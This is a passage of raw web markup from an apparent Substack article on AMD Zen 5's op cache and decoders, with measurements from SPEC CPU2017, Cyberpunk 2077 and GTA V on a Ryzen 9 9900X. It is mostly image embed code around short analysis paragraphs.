target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png" width="1456" height="877" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:877,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:237479,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c3af1fc-6098-4f6c-ad3c-caaace0dd380_1716x1034.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>The strange jump in decoder utilization across SPEC CPU2017’s floating point tests is gone with both SMT threads active. Likely, the two decode clusters together have enough headroom to hide whatever inefficiencies show up in single threaded mode.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png" width="1456" height="1009" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/d12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1009,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:282836,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd12a13db-25a4-4599-bdfd-2a773dbddc95_1727x1197.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Extremely high IPC workloads like 538.imagick do push the clustered decoder quite hard. But overall, the 2×4 decode scheme does well at handling SMT.</p><p>Cyberpunk 2077 is a game that rewards holding down the tab key. It also features a built-in benchmark. Built-in benchmarks don’t always provide the best representation of in-game performance, but do allow for more consistency without a massive time investment. To minimize variation, I ran the Ryzen 9 9900X with Core Performance Boost disabled. That caps clock speed at 4.4 GHz, providing consistent performance regardless of which core code is running on, or how many cores are active. I’ve also capped by Radeon RX 6900XT to 2 GHz to minimize GPU-side boost clock variation. However, I’m testing at 1080P with medium settings, so the GPU side shouldn’t be a limiting factor.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png" width="1456" height="794" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/17c26aa1-5736-4654-aae4-011563918789_2563x1397.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:794,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1267388,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F17c26aa1-5736-4654-aae4-011563918789_2563x1397.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>If you remember the previous article, the 7950X3D is actually 3.4% faster than this. That CPU swap certainly isn’t an upgrade from a gaming performance perspective</figcaption></figure></div><p>Turning the op cache on or off doesn’t make a big difference. That’s notable because games usually don’t run enough threads to benefit from SMT, especially on a high core count chip like the 9900X. However, games are also usually low IPC workloads and don’t benefit from the op cache’s high throughput. Cyberpunk 2077 certainly fits into that category, averaging just below 1 IPC. The Ryzen 9 9900X delivers just 0.17% better performance with the op cache enabled.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png" width="1456" height="777" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:777,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1165191,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2e56efb1-5db4-4e15-85b6-f01e9d85c676_2352x1255.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>In its normal configuration, Zen 5 sources 83.5% of micro-ops from the op cache. Hitrate isn’t quite as high as most of SPEC CPU2017’s workloads, with the notable exception of 507.cactuBSSN. However, that’s still enough to position the op cache as the primary source of instruction delivery.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png" width="1456" height="766" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:766,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:161617,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F604ad390-08e1-40ab-9138-9a79dc82ef08_1549x815.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>On average, the frontend uses the op cache for 16.3% of core active cycles, and the decoders for 5.3%. Zen 5’s frontend spends much of its time idle, as you’d expect for a low IPC workload. With the decoders carrying all the load, the frontend delivers ops over 27.4% of core active cycles.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png" width="1456" height="766" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:766,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:173724,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52df8ce1-d4f5-4ae8-843e-3c6d1a368b7a_1558x820.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>The decoders have to work a bit harder to feed the core, but they still have plenty of time to go on a lunch break, get coffee, and take a nap before getting back to work.</p><p>Grand Theft Auto V (GTA V) is an older game with plenty of red lights. Again, I’m running with Core Performance Boost disabled to favor consistency over maximum performance. Don’t take these results, even ones with the op cache enabled, to be representative of Zen 5’s stock performance.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png" width="1456" height="844" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/feb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:844,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:135537,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffeb7d120-c820-4d52-8089-fcd97892cc8f_1575x913.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Disabling the op cache basically makes no difference, except in the fourth pass, where the op cache gave a 1.3% performance boost. I don’t think that counts either, because no one will notice a 1.3% performance difference.</p><p>Zen 5’s op cache covers 77% of the instruction stream on average. Like Cyberpunk 2077, GTA V has a larger instruction footprint than many of SPEC CPU2017’s workloads. The op cache does well from an absolute perspective, but the decoders still handle a significant minority of the instruction stream.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png" width="1456" height="724" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/bc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:724,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:158471,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc168c45-fa43-4c7d-8414-9cf4213bde22_1461x726.png 1456w" sizes="100vw" 